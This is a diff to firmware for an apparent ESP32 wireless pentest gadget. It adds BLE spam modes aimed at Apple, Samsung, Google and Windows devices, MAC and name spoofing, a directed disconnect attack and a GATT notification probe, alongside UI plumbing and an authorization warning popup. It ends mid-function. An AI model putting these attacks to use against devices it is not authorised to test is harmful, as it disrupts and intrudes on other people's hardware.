@@ -144,6 +144,69 @@ typedef struct {
 static bt_device_info_t bt_devices[BT_MAX_DEVICES];
 static int bt_device_count = 0;
 
+// BLE Spam attack state
+#define BLE_SPAM_MODE_APPLE   0
+#define BLE_SPAM_MODE_SAMSUNG 1
+#define BLE_SPAM_MODE_GOOGLE  2
+#define BLE_SPAM_MODE_WINDOWS 3
+#define BLE_SPAM_MODE_ALL     4
+static volatile bool ble_spam_active = false;
+static TaskHandle_t ble_spam_task_handle = NULL;
+static lv_obj_t *ble_spam_status_label = NULL;
+static lv_obj_t *ble_spam_counter_label = NULL;
+static lv_obj_t *ble_spam_start_btn = NULL;
+static volatile int ble_spam_count = 0;
+static bool ble_spam_ui_active = false;
+static volatile bool ble_spam_needs_ui_update = false;
+static int ble_spam_mode = BLE_SPAM_MODE_ALL;
+
+// BLE Device Spoof state
+static volatile bool ble_spoof_active = false;
+static TaskHandle_t ble_spoof_task_handle = NULL;
+static lv_obj_t *ble_spoof_status_label = NULL;
+static lv_obj_t *ble_spoof_start_btn = NULL;
+static bool ble_spoof_ui_active = false;
+static int ble_spoof_target_idx = -1;
+static uint8_t ble_spoof_target_mac[6];          // authoritative target MAC for task
+static char ble_spoof_target_name_str[33];        // authoritative target name for task
+static uint16_t ble_spoof_target_company_id = 0; // authoritative company ID for task
+static volatile bool ble_spoof_needs_ui_update = false;
+
+// BLE Spoof general list (spooflist.txt)
+#define SPOOF_LIST_MAX  64
+#define SPOOF_LIST_PATH "/sdcard/lab/bluetooth/spooflist.csv"
+typedef struct { uint8_t mac[6]; char name[33]; } spoof_list_entry_t;
+static spoof_list_entry_t s_spoof_list[SPOOF_LIST_MAX];
+static int  s_spoof_list_count    = 0;
+static int  s_spoof_list_selected = -1;
+static lv_obj_t *s_spoof_add_popup  = NULL;
+static lv_obj_t *s_spoof_mac_ta     = NULL;
+static lv_obj_t *s_spoof_name_ta    = NULL;
+static lv_obj_t *s_spoof_list_scroll = NULL;
+static bool       s_spoof_delete[SPOOF_LIST_MAX];
+
+// BLE Disconnect attack state
+static volatile bool ble_disc_active = false;
+static TaskHandle_t ble_disc_task_handle = NULL;
+static lv_obj_t *ble_disc_status_label = NULL;
+static lv_obj_t *ble_disc_counter_label = NULL;
+static lv_obj_t *ble_disc_start_btn = NULL;
+static bool ble_disc_ui_active = false;
+static volatile int ble_disc_count = 0;
+static volatile bool ble_disc_needs_ui_update = false;
+static int ble_disc_target_idx = -1;
+static uint8_t ble_disc_target_mac[6];      // authoritative target MAC for task
+static uint8_t ble_disc_target_addr_type = 0;
+static uint16_t ble_disc_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+
+// Attack authorization warning popup
+static lv_obj_t *s_attack_warning_popup = NULL;
+
+// Return-destination overrides for BLE attacks launched from SAS actions
+// NULL = default (return to show_bt_attacks_screen)
+static void (*s_ble_spoof_return_fn)(void) = NULL;
+static void (*s_ble_disc_return_fn)(void) = NULL;
+
 // ============================================================================
 
 // Pin configuration — NM-CYD-C5 (RockBase-iot/NM-CYD-C5, User_Setup-NM-CYD-C5.h)
@@ -390,7 +453,7 @@ static StaticTask_t screenshot_task_buffer;
 static StackType_t *screenshot_task_stack = NULL;
 static volatile bool screenshot_in_progress = false;
 
-#define SCREENSHOT_DIR "/sdcard/screenshots"
+#define SCREENSHOT_DIR "/sdcard/lab/screenshots"
 
 typedef struct {
     lv_img_dsc_t *shot;
@@ -1094,7 +1157,7 @@ static uint8_t bt_sas_target_addr_type = 0;
 static char bt_sas_target_name[32];
 
 // ── BT Observer ─────────────────────────────────────────────────
-#define BTO_MAX_DEVICES 20
+#define BTO_MAX_DEVICES 40
 
 typedef enum {
     BTO_DEV_QUEUED = 0,
@@ -1134,6 +1197,7 @@ static TaskHandle_t     bto_task_handle     = NULL;
 static lv_obj_t        *bto_list            = NULL;
 static lv_obj_t        *bto_status_lbl      = NULL;
 static lv_timer_t      *bto_refresh_timer   = NULL;
+static lv_obj_t        *bto_spinner         = NULL;
 
 // ── BT Lookout (Dee Dee Detector) UI state ──────────────────────
 static bool        bt_lookout_ui_active       = false;
@@ -1146,6 +1210,16 @@ static lv_obj_t   *bt_lookout_oui_btn          = NULL;
 static lv_obj_t   *bt_lookout_popup_obj        = NULL;
 static lv_timer_t *bt_lookout_popup_tmr        = NULL;
 static TaskHandle_t bt_lookout_scan_loop_handle = NULL;
+
+// ── GATT Probe back-navigation target ────────────────────────────
+typedef enum { GW_PROBE_BACK_GATT_RESULT = 0, GW_PROBE_BACK_ATTACK_TILES, GW_PROBE_BACK_BTO_DETAIL } gw_probe_back_t;
+static gw_probe_back_t  g_probe_back           = GW_PROBE_BACK_GATT_RESULT;
+static int              g_probe_back_dev_idx   = -1;  /* device index when back target is BTO detail */
+static int              g_bto_rewalk_dev_idx   = -1;  /* ≥0 while re-walking a device before probe */
+static volatile bool    gw_probe_screen_active  = false;
+static lv_obj_t        *gw_probe_status_lbl     = NULL;
+static lv_timer_t      *gw_probe_timer          = NULL;
+static lv_timer_t      *g_bto_prepwalk_timer    = NULL; /* polls walk completion before auto-probe */
 
 // ── GATT Walker UI state ─────────────────────────────────────────
 static bool       gw_screen_active   = false;
@@ -1519,6 +1593,9 @@ static void bt_sas_refresh_list(void);
 static void show_bt_observer_screen(void);
 static void bt_observer_task(void *pvParameters);
 static void show_bto_device_detail(int dev_idx);
+static void bto_restore_screen(void);
+static void bto_stop_cb(lv_event_t *e);
+static void bto_rebuild_list(void);
 
 // Data Transfer screens
 static void show_data_transfer_screen(void);
@@ -1530,9 +1607,32 @@ static void show_bt_locator_direct_track(void);
 static void show_gatt_walker_screen(void);
 static void gw_update_screen_ui(void);
 static void gw_deferred_start_cb(lv_timer_t *t);
+static void gw_probe_btn_cb(lv_event_t *e);
+static void gw_probe_result_back_cb(lv_event_t *e);
+static void show_gw_probe_running_screen(void);
+static void show_gw_probe_result_screen(void);
+static void bto_probe_btn_cb(lv_event_t *e);
+static void bto_prepwalk_poll_cb(lv_timer_t *t);
+static void show_gw_result_screen(void);
 
 // BT Attacks
 static void show_bt_attacks_screen(void);
+static void show_ble_spoof_general_screen(void);
+static void show_spoof_add_entry_screen(void);
+static void show_directed_bt_attacks_screen(void);
+static void show_ble_spoof_directed_screen(void);
+static void show_ble_disc_directed_screen(void);
+static void show_ble_spam_screen(void);
+static void show_ble_spoof_screen(void);
+static void show_ble_disc_screen(void);
+static void ble_spam_task(void *pvParameters);
+static void ble_spoof_task(void *pvParameters);
+static void ble_disc_task(void *pvParameters);
+static void show_attack_warning(void (*proceed_fn)(void));
+static void deauther_proceed(void);
+static void handshakes_proceed(void);
+static void ble_spoof_proceed_from_sas(void);
+static void ble_disc_proceed_from_sas(void);
 
 // BT Lookout
 static void show_bt_lookout_screen(void);
@@ -5316,6 +5416,36 @@ void app_main(void)
             if (gw_ui_needs_update && gw_screen_active) {
                 gw_ui_needs_update = false;
                 gw_update_screen_ui();
+            }
+
+            // BLE Spam UI update
+            if (ble_spam_needs_ui_update && ble_spam_ui_active) {
+                ble_spam_needs_ui_update = false;
+                if (ble_spam_counter_label && lv_obj_is_valid(ble_spam_counter_label)) {
+                    char pbuf[32];
+                    snprintf(pbuf, sizeof(pbuf), "Packets: %d", ble_spam_count);
+                    lv_label_set_text(ble_spam_counter_label, pbuf);
+                }
+                if (ble_spam_status_label && lv_obj_is_valid(ble_spam_status_label)
+                    && ble_spam_active) {
+                    static const char *s_mode_names[] = {
+                        "Apple", "Samsung", "Google", "Windows", "All"
+                    };
+                    int m = ble_spam_mode < 5 ? ble_spam_mode : 4;
+                    char sbuf[48];
+                    snprintf(sbuf, sizeof(sbuf), "Sending: %s", s_mode_names[m]);
+                    lv_label_set_text(ble_spam_status_label, sbuf);
+                }
+            }
+
+            // BLE Disconnect UI update
+            if (ble_disc_needs_ui_update && ble_disc_ui_active) {
+                ble_disc_needs_ui_update = false;
+                if (ble_disc_counter_label && lv_obj_is_valid(ble_disc_counter_label)) {
+                    char dbuf[32];
+                    snprintf(dbuf, sizeof(dbuf), "Attempts: %d", ble_disc_count);
+                    lv_label_set_text(ble_disc_counter_label, dbuf);
+                }
             }
 
             // Deauth Monitor UI update
@@ -15976,8 +16106,8 @@ static const sd_provision_item_t SD_ITEMS[] = {
     { SD_ITEM_DIR,  "/sdcard/lab/alerts",                    NULL },
     { SD_ITEM_DIR,  "/sdcard/lab/config",                    NULL },
     { SD_ITEM_DIR,  "/sdcard/lab/bluetooth",                 NULL },
-    { SD_ITEM_DIR,  "/sdcard/gattwalker",                    NULL },  /* GATT Walker JSON output */
-    { SD_ITEM_DIR,  "/sdcard/screenshots",                   NULL },  /* screenshot capture */
+    { SD_ITEM_DIR,  "/sdcard/lab/gattwalker",                 NULL },  /* GATT Walker JSON output */
+    { SD_ITEM_DIR,  "/sdcard/lab/screenshots",               NULL },  /* screenshot capture */
     /* ── Seed files (written only on creation; never overwrite existing) ── */
     { SD_ITEM_FILE, "/sdcard/lab/white.txt",                 "" },
     { SD_ITEM_FILE, "/sdcard/lab/eviltwin.txt",              "" },
@@ -17874,7 +18004,7 @@ static void show_bluetooth_screen(void)
     lv_obj_add_event_cb(lookout_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"Dee Dee Detector");
 
     // BT Attacks - Orange (bottom-right, 6th tile)
-    lv_obj_t *btatk_tile = create_tile(tiles, LV_SYMBOL_WARNING, "BT\nAttacks", COLOR_MATERIAL_ORANGE, NULL, NULL);
+    lv_obj_t *btatk_tile = create_tile(tiles, LV_SYMBOL_WARNING, "BT\nAttacks", COLOR_MATERIAL_AMBER, NULL, NULL);
     lv_obj_add_event_cb(btatk_tile, (lv_event_cb_t)attack_event_cb, LV_EVENT_CLICKED, (void*)"BT Attacks");
 }
 
@@ -18297,7 +18427,62 @@ static void s_chr_props_desc(uint8_t p, char *buf, size_t bufsz)
 static void bto_detail_back_cb(lv_event_t *e)
 {
     (void)e;
-    show_bluetooth_screen();
+    bto_restore_screen();
+}
+
+/* Polls walk completion when a pre-walk is needed before probing a BTO device */
+static void bto_prepwalk_poll_cb(lv_timer_t *t)
+{
+    gw_state_t st = gw_get_state();
+    if (st == GW_STATE_COMPLETE) {
+        lv_timer_del(t);
+        g_bto_prepwalk_timer = NULL;
+        if (!gw_probe_start(8000)) {
+            /* probe failed to start — go back to detail */
+            gw_probe_result_back_cb(NULL);
+        }
+        /* On success: gw_probe_poll_cb takes over and drives to result screen */
+    } else if (st == GW_STATE_FAILED || st == GW_STATE_CANCELLED || st == GW_STATE_IDLE) {
+        lv_timer_del(t);
+        g_bto_prepwalk_timer = NULL;
+        gw_probe_result_back_cb(NULL);
+    }
+}
+
+static void bto_probe_btn_cb(lv_event_t *e)
+{
+    int dev_idx = (int)(intptr_t)lv_event_get_user_data(e);
+    if (dev_idx < 0 || dev_idx >= bto_device_count) return;
+
+    bto_device_t *d = &bto_devices[dev_idx];
+    g_probe_back         = GW_PROBE_BACK_BTO_DETAIL;
+    g_probe_back_dev_idx = dev_idx;
+    g_bto_rewalk_dev_idx = -1;
+
+    const gw_result_t *gw_r = gw_get_result();
+    gw_state_t st = gw_get_state();
+    bool mac_match = gw_r && (memcmp(gw_r->mac, d->addr, 6) == 0);
+    bool ready = mac_match && (st == GW_STATE_COMPLETE || st == GW_STATE_PROBE_DONE);
+
+    show_gw_probe_running_screen();
+
+    if (ready) {
+        /* Last walk was this device — probe immediately */
+        if (!gw_probe_start(8000))
+            gw_probe_result_back_cb(NULL);
+    } else {
+        /* Different device — re-walk to get fresh handles, then auto-probe */
+        if (gw_probe_status_lbl && lv_obj_is_valid(gw_probe_status_lbl))
+            lv_label_set_text(gw_probe_status_lbl, "Preparing...");
+        double lat = current_gps.valid ? (double)current_gps.latitude  : 0.0;
+        double lon = current_gps.valid ? (double)current_gps.longitude : 0.0;
+        if (!gw_walk(d->addr, d->addr_type, d->name[0] ? d->name : "Unknown",
+                     d->rssi, lat, lon, current_gps.valid)) {
+            gw_probe_result_back_cb(NULL);
+            return;
+        }
+        g_bto_prepwalk_timer = lv_timer_create(bto_prepwalk_poll_cb, 200, NULL);
+    }
 }
 
 static void show_bto_device_detail(int dev_idx)
@@ -18411,8 +18596,11 @@ static void show_bto_device_detail(int dev_idx)
             gw_chr_props_str((uint8_t)props, prop_buf, sizeof(prop_buf));
             char prop_desc[96];
             s_chr_props_desc((uint8_t)props, prop_desc, sizeof(prop_desc));
-            char row[140];
-            snprintf(row, sizeof(row), "  Props: %s (%s)", prop_buf, prop_desc);
+            char row[180];
+            if (props & (0x10 | 0x20))
+                snprintf(row, sizeof(row), "  Props: %s (%s)  [~CCCD]", prop_buf, prop_desc);
+            else
+                snprintf(row, sizeof(row), "  Props: %s (%s)", prop_buf, prop_desc);
             DET_ROW(scrl, row, &lv_font_montserrat_12, COLOR_MATERIAL_ORANGE);
             in_chr = true;
         }
@@ -18454,29 +18642,113 @@ static void show_bto_device_detail(int dev_idx)
     heap_caps_free(jbuf);
 #undef BTO_DET_BUF
 
-done:
-    /* Back button */
-    lv_obj_t *back_btn = lv_btn_create(function_page);
-    lv_obj_set_size(back_btn, 110, 32);
-    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -6);
-    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x7B1FA2), LV_STATE_DEFAULT);
-    lv_obj_set_style_bg_color(back_btn, lv_color_lighten(lv_color_hex(0x7B1FA2), 40), LV_STATE_PRESSED);
-    lv_obj_set_style_border_width(back_btn, 0, 0);
-    lv_obj_set_style_radius(back_btn, 8, 0);
-    lv_obj_t *back_lbl = lv_label_create(back_btn);
-    lv_label_set_text(back_lbl, LV_SYMBOL_LEFT "  Back");
-    lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_12, 0);
-    lv_obj_set_style_text_color(back_lbl, lv_color_white(), 0);
-    lv_obj_center(back_lbl);
-    lv_obj_add_event_cb(back_btn, bto_detail_back_cb, LV_EVENT_CLICKED, NULL);
+done:;
+    /* Check if probe is available for this device */
+    {
+        bool can_probe = d->walk_ok; /* any successfully walked device can be probed */
+
+        /* Ext. Probe button (red if available, grey if not) */
+        lv_obj_t *det_probe_btn = lv_btn_create(function_page);
+        lv_obj_set_size(det_probe_btn, 108, 32);
+        lv_obj_align(det_probe_btn, LV_ALIGN_BOTTOM_MID, -62, -6);
+        lv_obj_set_style_bg_color(det_probe_btn,
+            can_probe ? lv_color_hex(0xC62828) : lv_color_make(70, 70, 70),
+            LV_STATE_DEFAULT);
+        lv_obj_set_style_bg_color(det_probe_btn,
+            can_probe ? lv_color_lighten(lv_color_hex(0xC62828), 40) : lv_color_make(70, 70, 70),
+            LV_STATE_PRESSED);
+        lv_obj_set_style_border_width(det_probe_btn, 0, 0);
+        lv_obj_set_style_radius(det_probe_btn, 8, 0);
+        lv_obj_t *det_probe_lbl = lv_label_create(det_probe_btn);
+        lv_label_set_text(det_probe_lbl, LV_SYMBOL_AUDIO "  Ext. Probe");
+        lv_obj_set_style_text_font(det_probe_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(det_probe_lbl, lv_color_white(), 0);
+        lv_obj_center(det_probe_lbl);
+        if (can_probe)
+            lv_obj_add_event_cb(det_probe_btn, bto_probe_btn_cb, LV_EVENT_CLICKED,
+                                (void *)(intptr_t)dev_idx);
+
+        /* Back button */
+        lv_obj_t *back_btn = lv_btn_create(function_page);
+        lv_obj_set_size(back_btn, 108, 32);
+        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 62, -6);
+        lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x7B1FA2), LV_STATE_DEFAULT);
+        lv_obj_set_style_bg_color(back_btn, lv_color_lighten(lv_color_hex(0x7B1FA2), 40), LV_STATE_PRESSED);
+        lv_obj_set_style_border_width(back_btn, 0, 0);
+        lv_obj_set_style_radius(back_btn, 8, 0);
+        lv_obj_t *back_lbl = lv_label_create(back_btn);
+        lv_label_set_text(back_lbl, LV_SYMBOL_LEFT "  Back");
+        lv_obj_set_style_text_font(back_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(back_lbl, lv_color_white(), 0);
+        lv_obj_center(back_lbl);
+        lv_obj_add_event_cb(back_btn, bto_detail_back_cb, LV_EVENT_CLICKED, NULL);
+    }
 }
 #undef DET_ROW
 
+/* Restore BT Observer list UI without resetting state or re-scanning */
+static void bto_restore_screen(void)
+{
+    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+    reset_function_page_children();
+
+    create_function_page_base("BT Observer");
+
+    bto_status_lbl = lv_label_create(function_page);
+    char sbuf[64];
+    switch (bto_state) {
+        case BTO_STATE_DONE:    snprintf(sbuf, sizeof(sbuf), "Done — %d device(s) enumerated", bto_device_count); break;
+        case BTO_STATE_STOPPED: snprintf(sbuf, sizeof(sbuf), "Stopped"); break;
+        default:                snprintf(sbuf, sizeof(sbuf), "%d device(s)", bto_device_count); break;
+    }
+    lv_label_set_text(bto_status_lbl, sbuf);
+    lv_obj_set_style_text_color(bto_status_lbl, ui_text_color(), 0);
+    lv_obj_set_style_text_font(bto_status_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_align(bto_status_lbl, LV_ALIGN_TOP_LEFT, 5, 35);
+
+    bto_list = lv_obj_create(function_page);
+    lv_obj_set_size(bto_list, lv_pct(100), LCD_V_RES - 30 - 18 - 44);
+    lv_obj_align(bto_list, LV_ALIGN_TOP_MID, 0, 52);
+    lv_obj_set_style_bg_color(bto_list, ui_bg_color(), 0);
+    lv_obj_set_style_border_color(bto_list, lv_color_hex(0x7B1FA2), 0);
+    lv_obj_set_style_border_width(bto_list, 1, 0);
+    lv_obj_set_flex_flow(bto_list, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_style_pad_all(bto_list, 3, 0);
+    lv_obj_set_style_pad_gap(bto_list, 3, 0);
+    lv_obj_set_scrollbar_mode(bto_list, LV_SCROLLBAR_MODE_AUTO);
+
+    lv_obj_t *exit_btn = lv_btn_create(function_page);
+    lv_obj_set_size(exit_btn, 110, 32);
+    lv_obj_align(exit_btn, LV_ALIGN_BOTTOM_MID, 0, -6);
+    lv_obj_set_style_bg_color(exit_btn, lv_color_hex(0x7B1FA2), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(exit_btn, lv_color_lighten(lv_color_hex(0x7B1FA2), 40), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(exit_btn, 0, 0);
+    lv_obj_set_style_radius(exit_btn, 8, 0);
+    lv_obj_t *exit_lbl = lv_label_create(exit_btn);
+    lv_label_set_text(exit_lbl, LV_SYMBOL_LEFT "  Back");
+    lv_obj_set_style_text_font(exit_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(exit_lbl, lv_color_white(), 0);
+    lv_obj_center(exit_lbl);
+    lv_obj_add_event_cb(exit_btn, bto_stop_cb, LV_EVENT_CLICKED, NULL);
+
+    bto_rebuild_list();
+}
+
+static void bto_spinner_destroy(void)
+{
+    if (bto_spinner && lv_obj_is_valid(bto_spinner)) {
+        lv_obj_del(bto_spinner);
+    }
+    bto_spinner = NULL;
+}
+
 static void bto_card_tap_cb(lv_event_t *e)
 {
+    if (bto_active) return;   /* scan still running — scroll is fine, selection is not */
     int idx = (int)(intptr_t)lv_event_get_user_data(e);
     if (idx < 0 || idx >= bto_device_count) return;
     if (bto_refresh_timer) { lv_timer_del(bto_refresh_timer); bto_refresh_timer = NULL; }
+    bto_spinner_destroy();
     bto_list = NULL; bto_status_lbl = NULL;
     show_bto_device_detail(idx);
 }
@@ -18486,6 +18758,7 @@ static void bto_stop_cb(lv_event_t *e)
     (void)e;
     bto_active = false;
     if (bto_refresh_timer) { lv_timer_del(bto_refresh_timer); bto_refresh_timer = NULL; }
+    bto_spinner_destroy();
     bto_list = NULL; bto_status_lbl = NULL;
     // restore user GATT timeout
     gw_set_timeout(g_gatt_timeout_ms);
@@ -18604,9 +18877,11 @@ static void bto_refresh_cb(lv_timer_t *t)
                 break;
             case BTO_STATE_DONE:
                 snprintf(buf, sizeof(buf), "Done - %d devices enumerated", bto_device_count);
+                bto_spinner_destroy();
                 break;
             case BTO_STATE_STOPPED:
                 snprintf(buf, sizeof(buf), "Stopped");
+                bto_spinner_destroy();
                 break;
             default:
                 snprintf(buf, sizeof(buf), "Initializing...");
@@ -18675,6 +18950,19 @@ static void show_bt_observer_screen(void)
     // Start 1s refresh timer
     bto_refresh_timer = lv_timer_create(bto_refresh_cb, 1000, NULL);
 
+    // Spinner overlay on lv_layer_top() — visible while scanning/walking
+    bto_spinner_destroy();
+    bto_spinner = lv_spinner_create(lv_layer_top(), 1000, 60);
+    lv_obj_set_size(bto_spinner, 28, 28);
+    lv_obj_align(bto_spinner, LV_ALIGN_TOP_RIGHT, -5, 32);
+    lv_obj_set_style_bg_opa(bto_spinner, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(bto_spinner, 0, 0);
+    lv_obj_set_style_arc_color(bto_spinner, lv_color_hex(0xAB47BC), LV_PART_INDICATOR);
+    lv_obj_set_style_arc_width(bto_spinner, 3, LV_PART_INDICATOR);
+    lv_obj_set_style_arc_color(bto_spinner, lv_color_hex(0x333333), LV_PART_MAIN);
+    lv_obj_set_style_arc_width(bto_spinner, 3, LV_PART_MAIN);
+    lv_obj_set_style_arc_opa(bto_spinner, LV_OPA_40, LV_PART_MAIN);
+
     // Switch radio and launch observer task
     if (!ensure_ble_mode()) {
         lv_label_set_text(bto_status_lbl, "BLE init failed!");
@@ -18726,6 +19014,16 @@ static void bt_observer_task(void *pvParameters)
         bto_devices[i].status = BTO_DEV_QUEUED;
     }
     bto_device_count = n;
+    /* Sort by RSSI descending — strongest signal first */
+    for (int _a = 0; _a < n - 1; _a++) {
+        for (int _b = _a + 1; _b < n; _b++) {
+            if (bto_devices[_b].rssi > bto_devices[_a].rssi) {
+                bto_device_t _tmp = bto_devices[_a];
+                bto_devices[_a]   = bto_devices[_b];
+                bto_devices[_b]   = _tmp;
+            }
+        }
+    }
     bto_ui_needs_update = true;
 
     if (n == 0 || !bto_active) {
@@ -18757,13 +19055,29 @@ static void bt_observer_task(void *pvParameters)
             continue;
         }
 
-        // Poll until GATT walk completes (5s connect + 3s enum buffer = 80 * 100ms)
-        for (int w = 0; w < 80 && bto_active; w++) {
+        // Poll until GATT walk completes (5s connect + 5s enum buffer = 100 * 100ms)
+        for (int w = 0; w < 100 && bto_active; w++) {
             gw_state_t st = gw_get_state();
             if (st == GW_STATE_COMPLETE || st == GW_STATE_FAILED ||
                 st == GW_STATE_CANCELLED || st == GW_STATE_IDLE)
                 break;
             vTaskDelay(pdMS_TO_TICKS(100));
+        }
+
+        // If walk still running after timeout, cancel it and wait for clean state
+        {
+            gw_state_t cs = gw_get_state();
+            if (cs != GW_STATE_COMPLETE && cs != GW_STATE_FAILED &&
+                cs != GW_STATE_CANCELLED && cs != GW_STATE_IDLE) {
+                gw_cancel();
+                for (int c = 0; c < 30 && bto_active; c++) {
+                    cs = gw_get_state();
+                    if (cs == GW_STATE_FAILED || cs == GW_STATE_CANCELLED ||
+                        cs == GW_STATE_IDLE  || cs == GW_STATE_COMPLETE)
+                        break;
+                    vTaskDelay(pdMS_TO_TICKS(100));
+                }
+            }
         }
 
         gw_state_t final = gw_get_state();
@@ -18959,12 +19273,224 @@ static void gw_cancel_btn_cb(lv_event_t *e)
     }
 }
 
+/* ── GATT Probe: running screen + result screen ──────────────────── */
+
+static void gw_probe_result_back_cb(lv_event_t *e)
+{
+    (void)e;
+    /* Cancel any pending pre-walk-then-probe sequence */
+    if (g_bto_prepwalk_timer) {
+        lv_timer_del(g_bto_prepwalk_timer);
+        g_bto_prepwalk_timer = NULL;
+        gw_cancel();
+    }
+    if (g_probe_back == GW_PROBE_BACK_GATT_RESULT)
+        show_gw_result_screen();
+    else if (g_probe_back == GW_PROBE_BACK_BTO_DETAIL && g_probe_back_dev_idx >= 0)
+        show_bto_device_detail(g_probe_back_dev_idx);
+    else
+        show_bt_attack_tiles_screen();
+}
+
+static void gw_probe_poll_cb(lv_timer_t *t)
+{
+    (void)t;
+    if (!gw_probe_screen_active) return;
+
+    gw_state_t st = gw_get_state();
+
+    if (gw_probe_status_lbl && lv_obj_is_valid(gw_probe_status_lbl))
+        lv_label_set_text(gw_probe_status_lbl, (const char *)gw_ui_status);
+
+    if (st == GW_STATE_PROBE_DONE) {
+        if (gw_probe_timer) { lv_timer_del(gw_probe_timer); gw_probe_timer = NULL; }
+        gw_probe_screen_active = false;
+        gw_probe_free_stack();
+        show_gw_probe_result_screen();
+    } else if (st == GW_STATE_FAILED || st == GW_STATE_CANCELLED) {
+        if (gw_probe_timer) { lv_timer_del(gw_probe_timer); gw_probe_timer = NULL; }
+        gw_probe_screen_active = false;
+        gw_probe_result_back_cb(NULL);
+    }
+}
+
+static void show_gw_probe_running_screen(void)
+{
+    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+    reset_function_page_children();
+    create_function_page_base("CCCD Probe");
+    apply_menu_bg();
+
+    gw_probe_screen_active = true;
+
+    gw_probe_status_lbl = lv_label_create(function_page);
+    lv_label_set_text(gw_probe_status_lbl, "Connecting...");
+    lv_obj_set_style_text_font(gw_probe_status_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(gw_probe_status_lbl, UI_ACCENT_CYAN, 0);
+    lv_obj_align(gw_probe_status_lbl, LV_ALIGN_CENTER, 0, -30);
+    lv_label_set_long_mode(gw_probe_status_lbl, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(gw_probe_status_lbl, lv_pct(90));
+    lv_obj_set_style_text_align(gw_probe_status_lbl, LV_TEXT_ALIGN_CENTER, 0);
+
+    lv_obj_t *spinner = lv_spinner_create(function_page, 1000, 60);
+    lv_obj_set_size(spinner, 44, 44);
+    lv_obj_align(spinner, LV_ALIGN_CENTER, 0, 32);
+    lv_obj_set_style_arc_color(spinner, UI_ACCENT_CYAN, LV_PART_INDICATOR);
+
+    gw_probe_timer = lv_timer_create(gw_probe_poll_cb, 200, NULL);
+}
+
+static void show_gw_probe_result_screen(void)
+{
+    const gw_result_t *r = gw_get_result();
+
+    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+    reset_function_page_children();
+    create_function_page_base("Probe Results");
+    apply_menu_bg();
+
+    lv_obj_t *scrl = lv_obj_create(function_page);
+    lv_obj_set_size(scrl, lv_pct(100), LCD_V_RES - 30 - 44);
+    lv_obj_align(scrl, LV_ALIGN_TOP_MID, 0, 30);
+    lv_obj_set_style_bg_color(scrl, ui_bg_color(), 0);
+    lv_obj_set_style_border_width(scrl, 0, 0);
+    lv_obj_set_style_pad_all(scrl, 6, 0);
+    lv_obj_set_style_pad_gap(scrl, 4, 0);
+    lv_obj_set_flex_flow(scrl, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_scrollbar_mode(scrl, LV_SCROLLBAR_MODE_AUTO);
+
+#define PR_ROW(parent, txt, font, col) do { \
+    lv_obj_t *_l = lv_label_create(parent); \
+    lv_label_set_text(_l, txt); \
+    lv_obj_set_style_text_font(_l, font, 0); \
+    lv_obj_set_style_text_color(_l, col, 0); \
+    lv_label_set_long_mode(_l, LV_LABEL_LONG_WRAP); \
+    lv_obj_set_width(_l, lv_pct(100)); \
+} while(0)
+
+    if (!r) {
+        PR_ROW(scrl, "No probe result.", &lv_font_montserrat_14, COLOR_MATERIAL_RED);
+        goto pr_done;
+    }
+
+    {
+        char hdr[64], mac_str[18];
+        snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 r->mac[5], r->mac[4], r->mac[3], r->mac[2], r->mac[1], r->mac[0]);
+        snprintf(hdr, sizeof(hdr), "%s", mac_str);
+        PR_ROW(scrl, hdr, &lv_font_montserrat_12, ui_text_color());
+
+        int probed = 0, got_data = 0;
+        for (int si = 0; si < r->svc_count; si++) {
+            const gw_svc_t *svc = &r->svcs[si];
+            bool svc_shown = false;
+            for (int ci = 0; ci < svc->chr_count; ci++) {
+                const gw_chr_t *chr = &svc->chrs[ci];
+                if (!chr->probe_attempted) continue;
+                probed++;
+
+                if (!svc_shown) {
+                    lv_obj_t *sep = lv_obj_create(scrl);
+                    lv_obj_set_size(sep, lv_pct(100), 1);
+                    lv_obj_set_style_bg_color(sep, ui_border_color(), 0);
+                    lv_obj_set_style_border_width(sep, 0, 0);
+                    const char *sn = gatt_uuid_name(svc->uuid_str);
+                    char sr[80];
+                    if (sn) snprintf(sr, sizeof(sr), "%s  %s", svc->uuid_str, sn);
+                    else    snprintf(sr, sizeof(sr), "%s", svc->uuid_str);
+                    PR_ROW(scrl, sr, &lv_font_montserrat_12, UI_ACCENT_CYAN);
+                    svc_shown = true;
+                }
+
+                const char *cn = gatt_uuid_name(chr->uuid_str);
+                char cr[80];
+                if (cn) snprintf(cr, sizeof(cr), "  %s  %s", chr->uuid_str, cn);
+                else    snprintf(cr, sizeof(cr), "  %s", chr->uuid_str);
+                PR_ROW(scrl, cr, &lv_font_montserrat_12, ui_text_color());
+
+                if (chr->probe_cccd_ok) {
+                    if (chr->probe_frame_count > 0) {
+                        got_data++;
+                        char fr[48];
+                        snprintf(fr, sizeof(fr), "  Subscribed: %d frame(s)",
+                                 chr->probe_frame_count);
+                        PR_ROW(scrl, fr, &lv_font_montserrat_12, COLOR_MATERIAL_GREEN);
+                        for (int fi = 0; fi < chr->probe_frame_count; fi++) {
+                            uint8_t flen = chr->probe_frame_lens[fi];
+                            /* Hex — up to 32 bytes shown, "..." if more */
+                            char hex[140];
+                            int hp = snprintf(hex, sizeof(hex), "    [%d] %dB  ", fi + 1, flen);
+                            int show = flen < 32 ? flen : 32;
+                            for (int bi = 0; bi < show; bi++)
